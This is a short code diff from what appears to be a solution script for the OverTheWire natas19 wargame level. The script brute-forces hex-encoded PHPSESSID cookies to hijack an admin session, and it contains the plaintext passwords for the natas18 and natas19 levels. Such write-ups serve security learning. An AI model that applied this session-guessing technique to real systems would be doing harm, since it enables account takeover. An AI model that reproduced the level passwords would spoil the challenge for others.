@@ -8,7 +8,7 @@ for sessid in range(1, 641):
 
     phpsessid = binascii.hexlify((str(sessid) + '-admin').encode('ascii')).decode('ascii')
     r = requests.get('http://natas19.natas.labs.overthewire.org',
-                     auth=('natas18', 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP'),
+                     auth=('natas19', '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs'),
                      cookies={'PHPSESSID': phpsessid})
 
     if 'You are an admin' in r.text:
